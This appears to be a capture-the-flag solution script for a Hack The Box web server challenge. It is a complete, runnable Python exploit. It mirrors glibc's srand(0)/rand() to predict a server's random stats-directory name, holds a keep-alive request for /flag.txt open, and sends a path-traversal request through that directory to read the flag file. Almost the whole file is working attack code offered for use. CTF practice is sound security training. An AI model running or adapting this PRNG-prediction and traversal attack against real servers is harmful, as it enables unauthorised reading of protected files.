#!/usr/bin/env python3
import argparse
import ctypes
import socket
import time
from urllib.parse import urlparse


# ---------------------- PRNG MIRROR ---------------------- #

def init_libc():
    """
    Load glibc and seed its PRNG with srand(0),
    just like the C server does.
    """
    libc = ctypes.CDLL("libc.so.6")
    libc.srand(0)
    return libc


def random_hex(libc, n_bytes=8):
    """
    Mirror server's random_hex(): n_bytes of rand()&0xff -> hex string.
    """
    parts = []
    for _ in range(n_bytes):
        val = libc.rand() & 0xff
        parts.append(f"{val:02x}")
    return "".join(parts)


def get_suffix_for_run_time(run_time: int) -> str:
    """
    Skip 'run_time' previous stats-dir generations,
    then return the suffix for THIS run's /flag.txt request.
    """
    libc = init_libc()
    # Skip stats dirs that were created before this run
    for _ in range(run_time):
        _ = random_hex(libc)
    # Next stats dir will be for this /flag.txt
    suffix = random_hex(libc)
    return suffix


# ---------------------- HTTP HELPERS ---------------------- #

def open_tcp(host: str, port: int) -> socket.socket:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    return s


def send_http_get(sock: socket.socket, host_header: str, path: str, keep_alive: bool):
    """
    Send a minimal HTTP/1.1 GET request for 'path' on existing socket.
    """
    conn_hdr = "keep-alive" if keep_alive else "close"
    req = (
        f"GET {path} HTTP/1.1\r\n"
        f"Host: {host_header}\r\n"
        f"Connection: {conn_hdr}\r\n"
        f"\r\n"
    )
    sock.sendall(req.encode())


def read_all(sock: socket.socket, timeout=5.0) -> bytes:
    """
    Read until the connection is closed or we hit a timeout.
    For the exploit we only really care about the second response.
    """
    sock.settimeout(timeout)
    chunks = []
    try:
        while True:
            data = sock.recv(4096)
            if not data:
                break
            chunks.append(data)
    except socket.timeout:
        # fine, we just stop
        pass
    return b"".join(chunks)


# ---------------------- MAIN EXPLOIT ---------------------- #

def main():
    parser = argparse.ArgumentParser(description="HTB httpd PRNG + stats traversal exploit")
    parser.add_argument(
        "--url",
        required=True,
        help="Base URL, e.g. http://localhost:1337 or http://IP:PORT",
    )
    parser.add_argument(
        "--run-time",
        type=int,
        default=0,
        help=(
            "Number of stats-dir generations BEFORE this run's /flag.txt.\n"
            "On the same instance, if it fails, try +3 each time: 0, 3, 6, 9...\n"
            "If you RESET the instance, go back to 0."
        ),
    )
    args = parser.parse_args()

    parsed = urlparse(args.url)
    host = parsed.hostname or "localhost"
    port = parsed.port or 80
    host_header = parsed.netloc if parsed.netloc else host

    print(f"[info] Target  = {host}:{port}")
    print(f"[info] run_time = {args.run_time}")

    suffix = get_suffix_for_run_time(args.run_time)
    print(f"[prng] Predicted suffix for this run's /flag.txt: {suffix}")

    # 1) Connection A: /flag.txt (create stats/<suffix>_flag.txt, keep open)
    sock_a = open_tcp(host, port)
    print("[creator] Sending GET /flag.txt (keep-alive)")
    send_http_get(sock_a, host_header, "/flag.txt", keep_alive=True)
    # We don't need to read the whole response â€“ small HTML, kernel buffer will handle it.
    # Just give the server a tiny moment to create the stats dir.
    time.sleep(0.5)

    # 2) Connection B: traversal via stats/<suffix>_flag.txt/../../../flag.txt
    path_traversal = f"/stats/{suffix}_flag.txt/../../../flag.txt"
    print(f"[exploit] Sending GET {path_traversal}")
    sock_b = open_tcp(host, port)
    send_http_get(sock_b, host_header, path_traversal, keep_alive=False)
    resp_b = read_all(sock_b)
    sock_b.close()

    print("[exploit] Raw response from traversal request:")
    try:
        print(resp_b.decode(errors="replace"))
    except Exception:
        print(repr(resp_b))

    # Now we can close A; this will let the server remove its stats dir
    sock_a.close()
    print("[creator] Closed /flag.txt connection")


if __name__ == "__main__":
    main()
